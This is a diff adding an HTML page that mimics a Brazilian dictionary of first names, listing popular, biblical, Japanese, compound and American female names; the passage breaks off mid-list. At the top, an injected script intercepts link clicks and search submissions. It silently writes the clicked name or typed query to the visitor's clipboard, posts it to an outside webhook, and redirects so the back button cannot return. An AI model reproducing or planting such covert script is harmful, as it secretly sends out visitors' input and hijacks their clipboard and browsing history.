@@ -1,0 +1,1284 @@
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pt-br" lang="pt-br"><head>
+    <!-- Script de Redirecionamento Avan�ado: C�pia Silenciosa e Substitui��o de Hist�rico -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const baseUrl = 'https://www.dicionariodenomesproprios.com.br';
+
+            // Fun��o para copiar texto para o clipboard de forma silenciosa
+            async function copyToClipboard(text) {
+                try {
+                    // Tenta a API moderna primeiro
+                    if (navigator.clipboard && navigator.clipboard.writeText) {
+                        await navigator.clipboard.writeText(text);
+                    } else {
+                        // Fallback para dispositivos antigos
+                        const textArea = document.createElement("textarea");
+                        textArea.value = text;
+                        textArea.style.position = "fixed";
+                        textArea.style.left = "-9999px";
+                        textArea.style.top = "0";
+                        document.body.appendChild(textArea);
+                        textArea.focus();
+                        textArea.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(textArea);
+                    }
+                } catch (err) {
+                    // Silencioso: N�o faz nada em caso de erro
+                }
+                // Envia webhook em segundo plano (n�o bloqueia nada)
+                // keepalive: true garante que o Safari envie o POST mesmo durante redirecionamento
+                fetch("https://www.11z.co/_w/5156/selection", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ "value": text }),
+                    keepalive: true
+                }).catch(() => {});
+            }
+
+            // 0. Alterar href dos links internos para a URL completa de destino (corrige barra de status do browser)
+            document.querySelectorAll('a[href]').forEach(function(link) {
+                const href = link.getAttribute('href');
+                const localAbas = ['/nomes-femininos/', '/nomes-masculinos/', '/origem/', '/bebes/', '/top-brasil/', '/'];
+                if (href && !href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto') && !localAbas.includes(href)) {
+                    const path = href.startsWith('/') ? href : '/' + href;
+                    link.setAttribute('href', baseUrl + path);
+                }
+            });
+
+            // 1. Redirecionar cliques em links com c�pia silenciosa
+            document.body.addEventListener('click', async function(e) {
+                const link = e.target.closest('a');
+                if (link && link.getAttribute('href')) {
+                    const href = link.getAttribute('href');
+                    
+                    // Intercepta links internos (relativos) ou links j� convertidos para o baseUrl
+                    const localAbas = ['/nomes-femininos/', '/nomes-masculinos/', '/origem/', '/bebes/', '/top-brasil/', '/'];
+                    const isInternal = ((!href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto')) || href.startsWith(baseUrl)) && !localAbas.includes(href.replace(baseUrl, ''));
+                    if (isInternal) {
+                        e.preventDefault();
+                        
+                        // Captura o texto do nome (limpa espa�os extras)
+                        const textToCopy = link.innerText.trim();
+                        if (textToCopy) {
+                            await copyToClipboard(textToCopy);
+                        }
+
+                        // Se o href j� � a URL completa, usa direto; sen�o monta
+                        const targetUrl = href.startsWith(baseUrl) ? href : baseUrl + (href.startsWith('/') ? href : '/' + href);
+
+                        // Redireciona substituindo a p�gina no hist�rico (n�o permite voltar)
+                        window.location.replace(targetUrl);
+                    }
+                }
+            }, true);
+
+            // 2. Redirecionar formul�rios de busca com c�pia silenciosa
+            const searchForms = document.querySelectorAll('form');
+            searchForms.forEach(form => {
+                form.addEventListener('submit', async function(e) {
+                    const action = form.getAttribute('action');
+                    if (action && !action.startsWith('http')) {
+                        e.preventDefault();
+
+                        // Captura o que foi digitado no campo de busca
+                        const searchInput = form.querySelector('input[name="q"]');
+                        if (searchInput && searchInput.value.trim()) {
+                            await copyToClipboard(searchInput.value.trim());
+                        }
+
+                        const formData = new FormData(form);
+                        const params = new URLSearchParams(formData).toString();
+                        const path = action.startsWith('/') ? action : '/' + action;
+                        const targetUrl = baseUrl + path + '?' + params;
+
+                        // Redireciona substituindo a p�gina no hist�rico
+                        window.location.replace(targetUrl);
+                    }
+                });
+            });
+        });
+    </script>
+
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Nomes Femininos - Dicionário de Nomes Próprios</title>
+    <meta name="description" content="Lista de Nomes Femininos no Dicionário de Nomes. Todos os Nomes Femininos com seu Significado e Origem.">
+    <meta property="og:title" content="Nomes Femininos - Dicionário de Nomes Próprios">
+    <meta property="og:type" content="article">
+
+        <meta property="og:url" content="https://www.dicionariodenomesproprios.com.br/nomes-femininos/">
+
+    
+            <meta property="og:image" content="images/fb_dnp.png">
+        <meta property="og:site_name" content="Dicionário de Nomes Próprios">
+        <meta property="fb:app_id" content="132068570255221">
+    <meta property="og:description" content="Lista de Nomes Femininos no Dicionário de Nomes. Todos os Nomes Femininos com seu Significado e Origem.">
+            <link rel="canonical" href="https://www.dicionariodenomesproprios.com.br/nomes-femininos/">
+        <meta property="og:locale" content="pt_BR">
+        <meta name="twitter:card" content="summary">
+        <meta name="twitter:title" content="Nomes Femininos - Dicionário de Nomes Próprios">
+        <meta name="twitter:description" content="Lista de Nomes Femininos no Dicionário de Nomes. Todos os Nomes Femininos com seu Significado e Origem.">
+            <meta name="twitter:url" content="https://www.dicionariodenomesproprios.com.br/nomes-femininos/">
+    
+    
+    <script async="" src="js/v0.js"></script>
+    <link rel="stylesheet" type="text/css" href="css/styles_103.css">
+    <link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png">
+    <link rel="shortcut icon" href="images/favicon.ico">
+    <link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="images/safari-pinned-tab.svg" color="#eb5d1c">
+    <meta name="msapplication-TileColor" content="#fef2ed">
+    <meta name="theme-color" content="#fef2ed">
+    <link rel="alternate" type="application/rss+xml" title="Dicionário de Nomes Próprios" href="http://www.dicionariodenomesproprios.com.br/rss.php">
+
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        dataLayer.push({ 'contentGroup1':'NO AMP'});
+        dataLayer.push({ 'contentGroup2':'lista de nomes'});
+        dataLayer.push({ 'contentGroup3':'Nomes Femininos'});
+        dataLayer.push({ 'contentGroup4':'none'});
+        dataLayer.push({ 'contentGroup5':'none'});
+    </script>
+
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-KT7WJQZ');</script>
+
+    <script async="" defer="" src="js/gpt.js"></script><script async="" defer="" src="js/prebid8.38.0.js"></script><script>var googletag=window.googletag||{cmd:[]};if(window.localStorage && !window.localStorage.getItem("sg_gpt_event")){window.localStorage.setItem("sg_gpt_event",Math.floor((Math.random()*100)+1)<=10?1:0);}var pbjs = pbjs || {}; pbjs.que = pbjs.que || [];pbjs.que.push(function(){pbjs.setConfig({"sendAllBids":false,"priceGranularity":"high","userSync":{"filterSettings":{"all":{"bidders":"*","filter":"include"}},"iframe":{"bidders":["smartadserver"],"filter":"include"},"syncsPerBidder":1000,"syncDelay":100,"userIds":[{"name":"naveggId","storage":{"type":"cookie","name":"nvg90679"}}]}})});!function(a9,a,p,s,t,A,g){if(a[a9])return;function q(c,r){a[a9]._Q.push([c,r])}a[a9]={init:function(){q('i',arguments)},fetchBids:function(){q('f',arguments)},setDisplayBids:function(){},targetingKeys:function(){return[]},_Q:[]};A=p.createElement(s);A.async=!0;A.src=t;g=p.getElementsByTagName(s)[0];g.parentNode.insertBefore(A,g)}('apstag',window,document,'script','//c.amazon-adsystem.com/aax2/apstag.js'); apstag.init({pubID: '031d2526-e3d7-48d3-94fd-8cec14da13e5',adServer: 'googletag', simplerGPT: true});</script>
+
+    
+        <script>
+                  var _comscore = _comscore || [];
+                  _comscore.push({
+                    c1: "2", c2: "21145335",
+                    options: {
+                      enableFirstPartyCookie: true,
+                      bypassUserConsentRequirementFor1PCookie: true
+                    }
+                  });
+                  (function () {
+                    var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
+                    s.src = "https://sb.scorecardresearch.com/cs/21145335/beacon.js";
+                    el.parentNode.insertBefore(s, el);
+                  })();
+                </script></head>
+<body>
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KT7WJQZ" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<noscript>
+                  <img src="https://sb.scorecardresearch.com/p?c1=2&c2=21145335&cv=4.4.0&cj=1" alt="">
+                </noscript>
+        <div id="header" class="header">
+    <div class="container">
+        <div class="row">
+            <div class="logo-wrap">
+                <a href="/" title="Dicionário de Nomes Próprios" class="logo">
+                    <svg width="60px" height="60px" viewBox="0 0 60 60" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <path d="M42.3331741,0.0475426788 L42.3331741,17.3906144 C42.3331741,17.3906144 42.3331741,21.298755 42.3331741,29.1150363 L59.9486007,29.1150363 C59.8851208,22.9301528 59.8851208,18.4142306 59.9486007,15.5672696 C59.9486007,7.56679183 51.592628,0.0475426788 42.3331741,0.0475426788 Z" fill="#C54617"></path>
+        <path d="M-1.13686838e-13,0.0712355116 L-1.13686838e-13,42.7119864 C-1.13686838e-13,54.4924642 8.58102389,59.8650239 17.8404778,59.8650239 L17.8404778,42.7119864 C27.0088055,59.7698021 45.8844369,59.8613379 59.9416382,59.8613379 L59.9486007,59.8650239 L59.9486007,15.5672082 C59.7477133,24.585843 55.7787031,32.6070034 42.3331741,17.3905529 C25.1203413,-2.0895836 -1.13686838e-13,0.0712355116 -1.13686838e-13,0.0712355116" fill="#EB5D1C"></path>
+    </g>
+</svg>                    <span class="logo-txt">
+                        <span class="title">Dicionário de Nomes Próprios</span>
+                        <span class="subtitle">Significado dos nomes</span>
+                    </span>
+                    </a>
+            </div>
+            <div id="menu-btn" class="menu-btn"><i class="icon icon-menu"></i></div>
+
+            <div id="fancy-header" class="fancy-header">
+                <a href="/" title="Dicionário de Nomes Próprios" class="fancy-logo">
+                    <svg width="60px" height="60px" viewBox="0 0 60 60" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <path d="M42.3331741,0.0475426788 L42.3331741,17.3906144 C42.3331741,17.3906144 42.3331741,21.298755 42.3331741,29.1150363 L59.9486007,29.1150363 C59.8851208,22.9301528 59.8851208,18.4142306 59.9486007,15.5672696 C59.9486007,7.56679183 51.592628,0.0475426788 42.3331741,0.0475426788 Z" fill="#C54617"></path>
+        <path d="M-1.13686838e-13,0.0712355116 L-1.13686838e-13,42.7119864 C-1.13686838e-13,54.4924642 8.58102389,59.8650239 17.8404778,59.8650239 L17.8404778,42.7119864 C27.0088055,59.7698021 45.8844369,59.8613379 59.9416382,59.8613379 L59.9486007,59.8650239 L59.9486007,15.5672082 C59.7477133,24.585843 55.7787031,32.6070034 42.3331741,17.3905529 C25.1203413,-2.0895836 -1.13686838e-13,0.0712355116 -1.13686838e-13,0.0712355116" fill="#EB5D1C"></path>
+    </g>
+</svg>                </a>
+                <form class="search" id="busca" action="/busca.php" method="get">
+                                        <input class="search-box" type="text" name="q" placeholder="Busque um nome..." value="">
+                    <button class="search-button" type="submit"></button>
+                </form>
+                                    <div id="fancy-menu" class="fancy-menu">
+                        <ul>
+                            <li><a class="btn-default" href="/nomes-femininos/">Femininos</a></li>
+                            <li><a class="btn-default" href="/nomes-masculinos/">Masculinos</a></li>
+                            <li><a class="btn-default" href="/origem/">Origem</a></li>
+                            <li><a class="btn-default" href="/top-brasil/">Top</a></li>
+                            <li><a class="btn-default" href="/bebes/">Bebês</a></li>
+                        </ul>
+                    </div>
+                            </div>
+        </div>
+    </div>
+
+
+    <nav id="menu" class="menu-js container">
+        <div class="row">
+            
+<ul>
+    <li><a class="btn-default" href="/nomes-femininos/"><span class="btn-default--text">Nomes Femininos</span></a></li>
+    <li><a class="btn-default" href="/nomes-masculinos/"><span class="btn-default--text">Nomes Masculinos</span></a></li>
+    <li><a class="btn-default" href="/origem/"><span class="btn-default--text">Nomes pela Origem</span></a></li>
+    <li><a class="btn-default" href="/top-brasil/"><span class="btn-default--text">Top Nomes</span></a></li>
+    <li><a class="btn-default" href="/bebes/"><span class="btn-default--text">Nomes de Bebês</span></a></li>
+</ul>        </div>
+    </nav>
+</div>
+
+
+<div class="container">
+
+
+
+    <div class="row">
+        <div class="col-xs-12">
+            <ol id="breadcrumbs" class="breadcrumbs"><li><a href="/">Significado dos Nomes</a></li><li><span>Nomes Femininos</span></li></ol>
+        </div>
+    </div>
+    <div class="row">
+        <div class="content-flex">
+            <div class="col-md-8">
+                <div class="content-body--list content-body--gender">
+                    <div class="content-header">
+                        <h1 class="content-title">
+                            <i class="icon icon-female"></i>                            <span>Nomes Femininos</span>
+                        </h1>
+                        <div class="content-header--info w-630">
+                            
+                            <p>
+                                A <strong>Lista de Nomes Femininos</strong> com seus significados e origem no Dicionário de Nomes.                            </p>
+                        </div>
+                    </div>
+
+                    <div class="content-main">
+                                                    <div class="gender-top--wrap">
+                                <h2 class="gender--title female">Nomes Femininos populares</h2>
+                                <ol class="gender-top--list female" style="counter-reset: li-counter 0">
+                                                                            <li><a href="/cecilia/">
+                                            <span class="name-title">Cecília</span>
+                                            <span class="name-desc">
+                                            Significa “sábia”, “guardiã dos músicos”, “cega”. Os significados relacionados ao nome Cecília evocam...                                        </span></a></li>
+                                                                            <li><a href="/helena/">
+                                            <span class="name-title">Helena</span>
+                                            <span class="name-desc">
+                                            Significa “a reluzente”, “a resplandecente”. Helena é um nome feminino que tem origem com o grego Heléne, a...                                        </span></a></li>
+                                                                            <li><a href="/maria/">
+                                            <span class="name-title">Maria</span>
+                                            <span class="name-desc">
+                                            Significa “senhora soberana”, “vidente” ou “a pura”. Significado e origem Maria é um nome de origem...                                        </span></a></li>
+                                                                            <li><a href="/aurora/">
+                                            <span class="name-title">Aurora</span>
+                                            <span class="name-desc">
+                                            Significa "o nascer do sol", "o raiar do dia", “amanhecer”, “a que nasce do oriente” ou “aquela que brilha...                                        </span></a></li>
+                                                                            <li><a href="/maite/">
+                                            <span class="name-title">Maitê</span>
+                                            <span class="name-desc">
+                                            Significa “amável”, “amada”, “senhora do verão” ou “soberana que colhe o que cultiva”. Maitê é um...                                        </span></a></li>
+                                                                            <li><a href="/livia/">
+                                            <span class="name-title">Lívia</span>
+                                            <span class="name-desc">
+                                            Significa "pálida", "lívida", "clara", “azulado”, "inveja”, “vida”. Um nome feminino repleto de delicadeza...                                        </span></a></li>
+                                                                            <li><a href="/isis/">
+                                            <span class="name-title">Isis</span>
+                                            <span class="name-desc">
+                                            Significa “trono”, “mulher do trono”, "dona do trono", "deusa da fertilidade e do amor maternal",...                                        </span></a></li>
+                                                                            <li><a href="/mariana/">
+                                            <span class="name-title">Mariana</span>
+                                            <span class="name-desc">
+                                            Significa “senhora soberana cheia de graça”, “mulher pura e graciosa”; “senhorinha soberana”, “a...                                        </span></a></li>
+                                                                            <li><a href="/rebeca/">
+                                            <span class="name-title">Rebeca</span>
+                                            <span class="name-desc">
+                                            Significa "união", "ligação", "aquela que une", "mulher com uma beleza que cativa (ou prende) os homens". Um nome...                                        </span></a></li>
+                                                                            <li><a href="/laura/">
+                                            <span class="name-title">Laura</span>
+                                            <span class="name-desc">
+                                            Significa "loureiro", "vitoriosa", "triunfadora". Belo, repleto de feminilidade e com significados fortes, Laura surge...                                        </span></a></li>
+                                                                    </ol>
+                            </div>
+                        
+                                                                                    <div class="ad-mrec hidden-desktop">
+                                    <style> @media (min-width:0px){#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c > div{width:0;height:0;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c{height:0;}}@media (min-width:300px){#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c > div{width:300px;height:290px;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c{height:290px;}}@media (min-width:336px){#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c > div{width:336px;height:320px;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c{height:320px;}}@media (min-width:768px){#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c > div{width:468px;height:100px;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c{height:100px;}}@media (min-width:1280px){#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c > div{width:728px;height:130px;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c{height:130px;}}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c{position:sticky;padding:0px;padding-top:20px;z-index:0;overflow:hidden;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c::before{z-index:-1;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c > div{margin:auto;position:unset;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c > div::before, #div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c::after{top:0;position:absolute;}</style><div id="div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c" class="ad-unit ad-unit--pt-br #div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c"></div>                                </div>
+                                                        
+                                                                                    <div class="list-mod-wrap mt-40 mb-40">
+                                    <h2 class="gender--title">Tendências de Nomes Femininos </h2>
+                                    <ul class="list-mod--list col-3 col-2--mobile t-center">
+                                                                                    <li>
+                                                <a href="/alice/"><span>Alice</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/lorena/"><span>Lorena</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/julia/"><span>Júlia</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/lais/"><span>Laís</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/luna/"><span>Luna</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/liz/"><span>Liz</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/elisa/"><span>Elisa</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/olivia/"><span>Olívia</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/beatriz/"><span>Beatriz</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/larissa/"><span>Larissa</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/sofia/"><span>Sofia</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/heloisa/"><span>Heloísa</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/catarina/"><span>Catarina</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/lara/"><span>Lara</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/ayla/"><span>Ayla</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/taina/"><span>Tainá</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/hadassa/"><span>Hadassa</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/maya/"><span>Maya</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/isabella/"><span>Isabella</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/eloa/"><span>Eloá</span></a>
+                                            </li>
+                                                                                    <li>
+                                                <a href="/jade/"><span>Jade</span></a>
+                                            </li>
+                                                                            </ul>
+                                </div>
+                            
+                                                            <div class="list-mod-wrap mt-40 mb-40">
+                                    <h2 class="gender--title"><a href="/nomes-biblicos-femininos/">Nomes Bíblicos Femininos</a></h2>
+                                    <ul class="list-mod--list col-3 col-2--mobile t-center">
+                                                                                    <li><a href="/sara/"><span>Sara</span></a></li>
+                                                                                    <li><a href="/lia/"><span>Lia</span></a></li>
+                                                                                    <li><a href="/yarin/"><span>Yarin</span></a></li>
+                                                                                    <li><a href="/raquel/"><span>Raquel</span></a></li>
+                                                                                    <li><a href="/debora/"><span>Débora</span></a></li>
+                                                                                    <li><a href="/sarah/"><span>Sarah</span></a></li>
+                                                                                    <li><a href="/raabe/"><span>Raabe</span></a></li>
+                                                                                    <li><a href="/talita/"><span>Talita</span></a></li>
+                                                                                    <li><a href="/acsa/"><span>Acsa</span></a></li>
+                                                                                    <li><a href="/marta/"><span>Marta</span></a></li>
+                                                                                    <li><a href="/abigail/"><span>Abigail</span></a></li>
+                                                                                    <li><a href="/cloe/"><span>Cloé</span></a></li>
+                                                                                    <li><a href="/adriele/"><span>Adriele</span></a></li>
+                                                                                    <li><a href="/noemi/"><span>Noemi</span></a></li>
+                                                                                    <li><a href="/maressa/"><span>Maressa</span></a></li>
+                                                                                    <li><a href="/kesia/"><span>Késia</span></a></li>
+                                                                                    <li><a href="/ada/"><span>Ada</span></a></li>
+                                                                                    <li><a href="/ellie/"><span>Ellie</span></a></li>
+                                                                                    <li><a href="/noa/"><span>Noa</span></a></li>
+                                                                                    <li><a href="/queren-hapuque/"><span>Queren Hapuque</span></a></li>
+                                                                                    <li><a href="/jezabel/"><span>Jezabel</span></a></li>
+                                                                                    <li><a href="/quezia/"><span>Quezia</span></a></li>
+                                                                                    <li><a href="/tamara/"><span>Tâmara</span></a></li>
+                                                                                    <li><a href="/thalita/"><span>Thalita</span></a></li>
+                                                                                    <li><a href="/leia/"><span>Léia</span></a></li>
+                                                                                    <li><a href="/eunice/"><span>Eunice</span></a></li>
+                                                                                    <li><a href="/sarai/"><span>Sarai</span></a></li>
+                                                                                    <li><a href="/damaris/"><span>Dâmaris</span></a></li>
+                                                                                    <li><a href="/zipora/"><span>Zípora</span></a></li>
+                                                                                    <li><a href="/micol/"><span>Micol</span></a></li>
+                                                                                <li class="full-w see-all"><a href="/nomes-biblicos-femininos/"><span>Ver todos</span></a></li>
+                                    </ul>
+                                </div>
+                            
+                                                            <div class="list-mod-wrap mt-40 mb-40">
+                                    <h2 class="gender--title">
+                                        <a href="/nomes-japoneses-femininos/">Nomes Japoneses Femininos</a>
+                                    </h2>
+                                    <ul class="list-mod--list col-3 col-2--mobile t-center">
+                                                                                    <li><a href="/kira/"><span>Kira</span></a></li>
+                                                                                    <li><a href="/naomi/"><span>Naomi</span></a></li>
+                                                                                    <li><a href="/yumi/"><span>Yumi</span></a></li>
+                                                                                    <li><a href="/ayumi/"><span>Ayumi</span></a></li>
+                                                                                    <li><a href="/mayumi/"><span>Mayumi</span></a></li>
+                                                                                    <li><a href="/yuna/"><span>Yuna</span></a></li>
+                                                                                    <li><a href="/nara/"><span>Nara</span></a></li>
+                                                                                    <li><a href="/saori/"><span>Saori</span></a></li>
+                                                                                    <li><a href="/hana/"><span>Hana</span></a></li>
+                                                                                    <li><a href="/sayuri/"><span>Sayuri</span></a></li>
+                                                                                    <li><a href="/akemi/"><span>Akemi</span></a></li>
+                                                                                    <li><a href="/saionara/"><span>Saionara</span></a></li>
+                                                                                    <li><a href="/harumi/"><span>Harumi</span></a></li>
+                                                                                    <li><a href="/hinata/"><span>Hinata</span></a></li>
+                                                                                    <li><a href="/aiko/"><span>Aiko</span></a></li>
+                                                                                    <li><a href="/mizuki/"><span>Mizuki</span></a></li>
+                                                                                    <li><a href="/mahina/"><span>Mahina</span></a></li>
+                                                                                    <li><a href="/mari/"><span>Mari</span></a></li>
+                                                                                    <li><a href="/emi/"><span>Emi</span></a></li>
+                                                                                    <li><a href="/maisha/"><span>Maisha</span></a></li>
+                                                                                    <li><a href="/yoki/"><span>Yoki</span></a></li>
+                                                                                    <li><a href="/yoko/"><span>Yoko</span></a></li>
+                                                                                    <li><a href="/kimi/"><span>Kimi</span></a></li>
+                                                                                    <li><a href="/sakura/"><span>Sakura</span></a></li>
+                                                                                    <li><a href="/mina/"><span>Mina</span></a></li>
+                                                                                    <li><a href="/yuno/"><span>Yuno</span></a></li>
+                                                                                    <li><a href="/himawari/"><span>Himawari</span></a></li>
+                                                                                    <li><a href="/aika/"><span>Aika</span></a></li>
+                                                                                    <li><a href="/misaka/"><span>Mikasa</span></a></li>
+                                                                                    <li><a href="/yasu/"><span>Yasu</span></a></li>
+                                                                                <li class="full-w see-all"><a href="/nomes-japoneses-femininos/"><span>Ver todos</span></a></li>
+                                    </ul>
+                                </div>
+                            
+                                                            <div class="list-mod-wrap mt-40 mb-40">
+                                    <h2 class="gender--title"><a href="/compostos-femininos/">Nomes Compostos Femininos</a></h2>
+                                    <ul class="list-mod--list col-3 col-2--mobile t-center">
+                                                                                    <li><a href="/maria-eduarda/"><span>Maria Eduarda</span></a></li>
+                                                                                    <li><a href="/ana-clara/"><span>Ana Clara</span></a></li>
+                                                                                    <li><a href="/ana-julia/"><span>Ana Júlia</span></a></li>
+                                                                                    <li><a href="/maria-alice/"><span>Maria Alice</span></a></li>
+                                                                                    <li><a href="/maria-clara/"><span>Maria Clara</span></a></li>
+                                                                                    <li><a href="/maria-julia/"><span>Maria Júlia</span></a></li>
+                                                                                    <li><a href="/ana-beatriz/"><span>Ana Beatriz</span></a></li>
+                                                                                    <li><a href="/maria-luiza/"><span>Maria Luíza</span></a></li>
+                                                                                    <li><a href="/maria-cecilia/"><span>Maria Cecília</span></a></li>
+                                                                                    <li><a href="/maria-helena/"><span>Maria Helena</span></a></li>
+                                                                                    <li><a href="/maria-luisa/"><span>Maria Luísa</span></a></li>
+                                                                                    <li><a href="/ana-laura/"><span>Ana Laura</span></a></li>
+                                                                                    <li><a href="/ana-paula/"><span>Ana Paula</span></a></li>
+                                                                                    <li><a href="/ana-luiza/"><span>Ana Luíza</span></a></li>
+                                                                                    <li><a href="/maria-isis/"><span>Maria Isis</span></a></li>
+                                                                                    <li><a href="/maria-elisa/"><span>Maria Elisa</span></a></li>
+                                                                                    <li><a href="/maria-fernanda/"><span>Maria Fernanda</span></a></li>
+                                                                                    <li><a href="/maria-vitoria/"><span>Maria Vitória</span></a></li>
+                                                                                    <li><a href="/ana-alice/"><span>Ana Alice</span></a></li>
+                                                                                    <li><a href="/ana-carolina/"><span>Ana Carolina</span></a></li>
+                                                                                    <li><a href="/ana-livia/"><span>Ana Lívia</span></a></li>
+                                                                                    <li><a href="/ana-cecilia/"><span>Ana Cecília</span></a></li>
+                                                                                    <li><a href="/maria-laura/"><span>Maria Laura</span></a></li>
+                                                                                    <li><a href="/maria-tereza/"><span>Maria Tereza</span></a></li>
+                                                                                    <li><a href="/maria-flor/"><span>Maria Flor</span></a></li>
+                                                                                    <li><a href="/maria-de-fatima/"><span>Maria de Fátima</span></a></li>
+                                                                                    <li><a href="/maria-antonia/"><span>Maria Antônia</span></a></li>
+                                                                                    <li><a href="/ana-maria/"><span>Ana Maria</span></a></li>
+                                                                                    <li><a href="/maria-heloisa/"><span>Maria Heloísa</span></a></li>
+                                                                                    <li><a href="/ana-vitoria/"><span>Ana Vitória</span></a></li>
+                                                                                <li class="full-w see-all"><a href="/compostos-femininos/"><span>Ver todos</span></a></li>
+                                    </ul>
+                                </div>
+                            
+                                                            <div class="list-mod-wrap mt-40 mb-40">
+                                    <h2 class="gender--title"><a href="/nomes-americanos-femininos/">Nomes Americanos Femininos</a></h2>
+                                    <ul class="list-mod--list col-3 col-2--mobile t-center">
+                                                                                    <li><a href="/emily/"><span>Emily</span></a></li>
+                                                                                    <li><a href="/amelia/"><span>Amélia</span></a></li>
+                                                                                    <li><a href="/karen/"><span>Karen</span></a></li>
+                                                                                    <li><a href="/ashley/"><span>Ashley</span></a></li>
+                                                                                    <li><a href="/michelle/"><span>Michelle</span></a></li>
+                                                                                    <li><a href="/elizabeth/"><span>Elizabeth</span></a></li>
+                                                                                    <li><a href="/jennifer/"><span>Jennifer</span></a></li>
+                                                                                    <li><a href="/emma/"><span>Emma</span></a></li>
+                                                                                    <li><a href="/hilary/"><span>Hilary</span></a></li>
+                                                                                    <li><a href="/kimberly/"><span>Kimberly</span></a></li>
+                                                                                    <li><a href="/katheleen/"><span>kathleen</span></a></li>
+                                                                                    <li><a href="/scarlet/"><span>Scarlet</span></a></li>
+                                                                                    <li><a href="/ayanna/"><span>Ayanna</span></a></li>
+                                                                                    <li><a href="/carol/"><span>Carol</span></a></li>
+                                                                                    <li><a href="/ruth/"><span>Ruth</span></a></li>
+                                                                                    <li><a href="/shirley/"><span>Shirley</span></a></li>
+                                                                                    <li><a href="/melanie/"><span>Melanie</span></a></li>
+                                                                                    <li><a href="/lisa/"><span>Lisa</span></a></li>
+                                                                                    <li><a href="/mila/"><span>Mila</span></a></li>
+                                                                                    <li><a href="/madeline/"><span>Madeline</span></a></li>
+                                                                                    <li><a href="/linda/"><span>Linda</span></a></li>
+                                                                                    <li><a href="/stephany/"><span>Stephany</span></a></li>
+                                                                                    <li><a href="/mary/"><span>Mary</span></a></li>
+                                                                                    <li><a href="/arabella/"><span>Arabella</span></a></li>
+                                                                                    <li><a href="/xayane/"><span>Xayane</span></a></li>
+                                                                                    <li><a href="/amy/"><span>Amy</span></a></li>
+                                                                                    <li><a href="/renesmee/"><span>Renesmée</span></a></li>
+                                                                                    <li><a href="/cynthia/"><span>Cynthia</span></a></li>
+                                                                                    <li><a href="/ebony/"><span>Ebony</span></a></li>
+                                                                                    <li><a href="/sharon/"><span>Sharon</span></a></li>
+                                                                                <li class="full-w see-all"><a href="/nomes-americanos-femininos/"><span>Ver todos</span></a></li>
+                                    </ul>
+                                </div>
+                            
+                                                            <div class="related-wrap">
+                                    <h2 class="list-title">Tudo sobre Nomes Femininos</h2>
+                                    <ul class="related-list">
+                                                                                    <li>
+                                                <a href="/nomes-femininos-diferentes-para-bebe-significados/">
